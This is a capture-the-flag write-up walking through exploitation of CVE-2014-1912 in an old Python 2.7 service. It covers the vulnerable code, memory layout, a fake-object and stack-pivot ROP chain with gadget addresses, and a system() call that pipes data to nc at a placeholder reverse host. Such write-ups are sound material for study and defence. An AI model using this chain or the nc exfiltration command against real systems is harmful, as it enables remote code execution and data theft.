## Vuln 1

The only vulnerability presented in the service is based on [CVE-2014-1912](https://www.cvedetails.com/cve/CVE-2014-1912/). You can easily (or maybe not) understand this by looking at python version (spoiler: it's too damn old) As stated in `Vulnerability Details` this vulnerability is about **buffer overflow**:

> Buffer overflow in the socket.recvfrom_into function in Modules/socketmodule.c in Python 2.5 before 2.7.7, 3.x before 3.3.4, and 3.4.x before 3.4rc1 allows remote attackers to execute arbitrary code via a crafted string.

Hence, grep the source code in order to find the vulnerable function in the first place:

```python
def add_listener(self, data):
    with self.lock:
        if len(self.listeners) >= self.max_ports_size:
            raise ValueError("too much listeners")
        lst_id = uuid.uuid4()

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", 0))
        current_port = sock.getsockname()[1]

        print >> sys.stderr, "opened socket at {}".format(current_port)

        t = threading.Thread(target=self.__create_listener, args=(sock, current_port, lst_id, data))
        self.listeners[lst_id] = t
        t.start()
        return current_port

def __create_listener(self, sock, port, lst_id, ds):
    try:
        arr = bytearray(min(self.udp_max_size, ds))
        _, __ = sock.recvfrom_into(arr, self.udp_max_size)
        self.__handle(arr)
    finally:
        print >> sys.stderr, "closed socket at {}".format(port)
        with self.lock:
            del self.listeners[lst_id]
```

HTTP GET route will be `ds`, i.e. the size of target `arr` bytearray. And then this buffer is passed into `sock.recvfrom_into` which will write incoming data into the allocated `arr` bytearray. For those of you who wants to see the actual vulnerable function here is the source code of [Modules/sockermodule.c](https://github.com/python/cpython/blob/2.7/Modules/socketmodule.c#L2740). Buffer overflow happens in `sock_recvfrom_guts` function.

From this moment here are two basic scenarios of an attack.

1. Pass non-zero value as the `bytearray` size. In this case `arr` will be allocated on heap and we've got **heap overflow** attack which is pretty good
2. Pass zero value as the `bytearray` size. In this case `arr` will be some special object named [_PyByteArray_empty_string](https://github.com/python/cpython/blob/2.7/Objects/bytearrayobject.c#L8) that is located in `.bss` section of `Python` binary.

Also, let's see at security mechanisms that are enabled for `Python` binary:

```
Canary     : ✓
NX         : ✓ 
PIE        : ✘ 
Fortify    : ✓ 
RelRO      : Partial
```

It doesn't have `PIE` and `RelRO` is `Partial` - in this case python binary memory sections will have fixed addresses, so no need in address leaks! We have two ways of exploitation as was stated before. For the sake of simplicitly second approach was choosen (zero size of `arr`) - in this case we will have overflow in `.bss` section.

Here is the memory view of some objects that are placed below [_PyByteArray_empty_string](https://github.com/python/cpython/blob/2.7/Objects/bytearrayobject.c#L8):

```
(gdb) x/100xg _PyByteArray_empty_string
0x7e4568 <_PyByteArray_empty_string>:   0x0000000000000000	0x0000000000000000
0x7e4578:                               0x0000000000000000	0x0000000000000000
0x7e4588 <emptystring.10526>:           0x0000000000000000	0x0000000000000000
0x7e4598:                               0x0000000000000000	0x0000000000000000
0x7e45a8 <ok_name_char.10482+8>:        0x0000000000000000	0x0000000000000000
0x7e45b8 <ok_name_char.10482+24>:       0x0000000000000000	0x0000000000000000
0x7e45c8 <ok_name_char.10482+40>:       0x0000000000000000	0x0101010101010101
0x7e45d8 <ok_name_char.10482+56>:       0x0000000000000101	0x0101010101010100
0x7e45e8 <ok_name_char.10482+72>:       0x0101010101010101	0x0101010101010101
0x7e45f8 <ok_name_char.10482+88>:       0x0100000000010101	0x0101010101010100
0x7e4608 <ok_name_char.10482+104>:      0x0101010101010101	0x0101010101010101
0x7e4618 <ok_name_char.10482+120>:      0x0000000000010101	0x0000000000000000
0x7e4628 <ok_name_char.10482+136>:      0x0000000000000000	0x0000000000000000
0x7e4638 <ok_name_char.10482+152>:      0x0000000000000000	0x0000000000000000
0x7e4648 <ok_name_char.10482+168>:      0x0000000000000000	0x0000000000000000
0x7e4658 <ok_name_char.10482+184>:      0x0000000000000000	0x0000000000000000
0x7e4668 <ok_name_char.10482+200>:      0x0000000000000000	0x0000000000000000
0x7e4678 <ok_name_char.10482+216>:      0x0000000000000000	0x0000000000000000
0x7e4688 <ok_name_char.10482+232>:      0x0000000000000000	0x0000000000000000
0x7e4698 <ok_name_char.10482+248>:      0x0000000000000000	0x0000000000000000
0x7e46a8 <reversed_cache.10506>:        0x0000000000000000	0x0000000000000000
0x7e46b8 <builtin_object>:              0x00007f15ca66b9d0	0x0000000000000000
0x7e46c8 <free_list>:                   0x0000000000000000	0x00007f15ca66cfc0
0x7e46d8 <numfree>:	                    0x0000000000000000	0x0000000000000000
0x7e46e8 <initialized.11498>:           0x0000000000000000	0x0000000000000000
0x7e46f8 <keyword_type>:                0x0000000000000000	0x0000000000000000
0x7e4708 <ExceptHandler_type>:          0x0000000000000000	0x0000000000000000
0x7e4718 <comprehension_type>:          0x0000000000000000	0x0000000000000000
```

From this point the most interesting part starts. After `recvfrom_into` function call some chain of function calls happen and the process flow gets into [PyFrame_New](https://github.com/python/cpython/blob/2.7/Objects/frameobject.c#L662) function. Look closely at this part of code:

```cpp
PyFrameObject *
PyFrame_New(PyThreadState *tstate, PyCodeObject *code, PyObject *globals,
            PyObject *locals)
{
    /* [...] */
    if (back == NULL || back->f_globals != globals) {
        builtins = PyDict_GetItem(globals, builtin_object);
        if (builtins) {
            if (PyModule_Check(builtins)) {
                builtins = PyModule_GetDict(builtins);
                assert(!builtins || PyDict_Check(builtins));
            }
            else if (!PyDict_Check(builtins))
                builtins = NULL;
        }
        if (builtins == NULL) {
            /* No builtins!              Make up a minimal one
                Give them 'None', at least. */
            builtins = PyDict_New();
            if (builtins == NULL ||
                PyDict_SetItemString(
                    builtins, "None", Py_None) < 0)
                return NULL;
        }
        else
            Py_INCREF(builtins);
    }
    /* [...] */
}
```

Process flow will get into this part of code, you can check it by yourself. Look at the second argument of `PyDict_GetItem` function call - it's `builtin_object` that is placed below [_PyByteArray_empty_string](https://github.com/python/cpython/blob/2.7/Objects/bytearrayobject.c#L8), so attacker can control value of this object! Now let's continue with the inspection of [PyDict_GetItem](https://github.com/python/cpython/blob/226a012d1cd61f42ecd3056c554922f359a1a35d/Objects/dictobject.c#L1398) function:

```cpp
PyObject *
PyDict_GetItem(PyObject *op, PyObject *key)
{
    /* [...] */
    Py_hash_t hash;
    if (!PyUnicode_CheckExact(key) ||
        (hash = ((PyASCIIObject *) key)->hash) == -1)
    {
        hash = PyObject_Hash(key);
        if (hash == -1) {
            PyErr_Clear();
            return NULL;
        }
    }
    /* [...] */
}
```

`key` is a pointer to `PyObject` object which the attacker can control. This object is then passed into [PyObject_Hash](https://github.com/python/cpython/blob/32bd68c839adb7b42af12366ab0892303115d1d1/Objects/object.c#L766) function:

```cpp
Py_hash_t
PyObject_Hash(PyObject *v)
{
    PyTypeObject *tp = Py_TYPE(v);
    if (tp->tp_hash != NULL)
        return (*tp->tp_hash)(v);
    if (tp->tp_dict == NULL) {
        if (PyType_Ready(tp) < 0)
            return -1;
        if (tp->tp_hash != NULL)
            return (*tp->tp_hash)(v);
    }
    return PyObject_HashNotImplemented(v);
}
```

Each PyObject has **a pointer to the function** that calculates hash of this object:

```cpp
if (tp->tp_hash != NULL)
    return (*tp->tp_hash)(v);
```

Now, it's time to summarize 1+1:

- `Python` binary has no `PIE`, hence we know its addresses

- Buffer overflow in `.bss` section which addresses attacker knows from the `Python` binary.

- Controlled `PyObject` object that calls function from the function pointer which attacker also controls (as long as he/she controls pointer to `PyObject` object and data inside of it)

So, assume we have the next memory view:

```
| _PyByteArray_empty_string | fake PyObject | builtin_object |
                               |   ^                 |
                               |   |                 |
                               |   +-----------------+
                               v
                         | PyTypeObject |
                               |
                               +-------> tp_hash ()
```

Attacker's payload will overwrite `builtin_object` with the address of fake `PyObject` that will be placed above of `builtin_object` (somewhere between `0x7e4568` and `0x7e46b8`). This `PyObject` will have pointer to `PyTypeObject` which eventually will have function pointer `tp_hash`. This chain of objects pointers gives an opportunity to call arbitrary `tp_hash` function - it can be any useful function pointer or some gadget.

Unfortunately, exploit author doesn't know any useful functions in `Python` binary that leads straight to RCE, so he has proceeded with tricky ROP gadget.

It's time to inspect part of the assembly of [PyDict_GetItem](https://github.com/python/cpython/blob/226a012d1cd61f42ecd3056c554922f359a1a35d/Objects/dictobject.c#L1398) function:

```asm
Dump of assembler code for function PyDict_GetItem:
   0x000000000045b1d0 <+0>:	    push   r12
   0x000000000045b1d2 <+2>:	    push   rbp
   0x000000000045b1d3 <+3>:	    push   rbx
   0x000000000045b1d4 <+4>:	    sub    rsp,0x20
   0x000000000045b1d8 <+8>:	    mov    rax,QWORD PTR fs:0x28
   0x000000000045b1e1 <+17>:    mov    QWORD PTR [rsp+0x18],rax
   0x000000000045b1e6 <+22>:    xor    eax,eax
   0x000000000045b1e8 <+24>:    mov    rax,QWORD PTR [rdi+0x8]
   0x000000000045b1ec <+28>:    test   BYTE PTR [rax+0xab],0x20
   0x000000000045b1f3 <+35>:    je     0x45b2d0 <PyDict_GetItem+256>
   0x000000000045b1f9 <+41>:    cmp    QWORD PTR [rsi+0x8],0x7a9440
   0x000000000045b201 <+49>:    mov    rbx,rdi
   0x000000000045b204 <+52>:    mov    rbp,rsi      <-- rsi is the controlled key
   0x000000000045b207 <+55>:    je     0x45b2b8 <PyDict_GetItem+232>
   0x000000000045b20d <+61>:    mov    rdi,rbp      <-- rdi = rbp = rsi
   0x000000000045b210 <+64>:    call   0x45fa00 <PyObject_Hash>
```

Pay carefull attention to the register of `PyObject` that is passed into [PyObject_Hash](https://github.com/python/cpython/blob/32bd68c839adb7b42af12366ab0892303115d1d1/Objects/object.c#L766) - it's `RBP`! Hence, attacker also controls `rbp` register which is super useful for [stack pivoting](https://bananamafia.dev/post/binary-rop-stackpivot/). The rest is to find `leave; ret` gadget. But not any `leave; ret` gadget will fit in our conditions - don't forget, it's `PyObject` that we control, so if we do stack pivoting, then the resulting ROP chain will be placed onto `PyObject`. And another funny thing about this `Python` binary - it doesn't use `leave; ret` epiloge. Instead, it uses `add rsp, X` for the purposes of restoring previous stack frames, so it took some time to find useful gadget:

```
0x00000000004a9f69: leave; add rsp, 8; xor eax, eax; pop rbx; pop rbp; ret; 
```

Alright, we're almost done. As long as we control `rbp` through `PyObject`, we can call `leave` instruction in order to shift current stack pointer to the address under `rbp` register - `PyObject`. From this point, the choosen gadget pops two values from the stack and ret. Perfect conditions to call `system("ls | nc <reverse_ip> <reverse_port>")` using `system` function that is linked into `Python` binary (we know its address) and arbitrary cmd as you like in order to leak yummy flags. The final chain is the following:

```
rdi (rbp) -> +------------------+
             |     PyObject     |
             +------------------+
        +0x0 |    0x41414141    | <-- leave = mov rsp, rbp; pop rbp; so it's new rbp after leave
             +------------------+
        +0x8 | PyTypeObject ptr | ----------------->  +--------------+
             +------------------+                     | PyTypeObject |
       +0x10 |    0x43434343    |                     +--------------+
             +------------------+               +0x78 |   tp_hash    | ------+
       +0x18 |     pop rdi      |                     +--------------+       |
             +------------------+                                            |
       +0x20 |    command ptr   | ---+                                       v
             +------------------+    |                         0x4a9f69: leave; add rsp, 8; xor eax, eax; pop rbx; pop rbp; ret;
       +0x28 |     pop rsi      |    |
             +------------------+    |
       +0x30 |    system addr   |    |
             +------------------+    |
       +0x40 | echo "Hallo" >>  | <--+
             | /app/storage/hal |
             | lo.he\x00        |
             +------------------+
```

When the whole chain is executed the attacker gets RCE on the remote server and can leak flags by opening reverse shell using `python` or creating a file inside of `/app/storage/* `  which contains all other flags. Possibilites are unlimited


Another funny note: There are [public exploits](https://www.exploit-db.com/exploits/31875) for this vulnerability, but they work only for `x86-32` architecture. Exploit author has no idea how this bug was exploited in public exploits, so he wrote an exploit from the scratch for `x86-64`

## Vuln 2

goto `Vuln_1`